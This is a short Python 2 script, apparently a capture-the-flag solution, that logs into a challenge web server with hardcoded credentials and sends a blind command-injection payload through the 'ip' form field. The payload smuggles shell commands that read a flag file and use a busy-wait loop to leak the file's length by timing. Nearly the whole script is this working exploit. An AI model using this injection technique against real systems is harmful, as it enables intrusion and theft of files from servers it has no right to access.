import urllib
import urllib2
import requests
import sys
url = 'https://172.27.20.32:8443/login.php'
values = {'username': 'sumedh',
          'password': 'CXbXPGbNfXNvBEL'}

session = requests.session()
r = session.post(url, data=values, verify=False)
#print r.content

url = 'https://172.27.20.32:8443/chal6.php'
for i in range(40):
	print "Trying ", i
	values = {'ip' : 'google.com"; if [ ' + str(i) + ' == $(/bin/cat "/flags/sumedh.flag" | awk "{print length}") ]; then { for(( c=1; c<=1000000; c++ )); do a=1; done }; fi; /bin/cat "/flags/sumedh.flag'}
	r = session.post(url, data=values, verify = False)
	if r.content.find("<script>alert('Host seems down')</script>") == 0:
		print "Length of the flag is " + str(i)
		sys.exit(0)



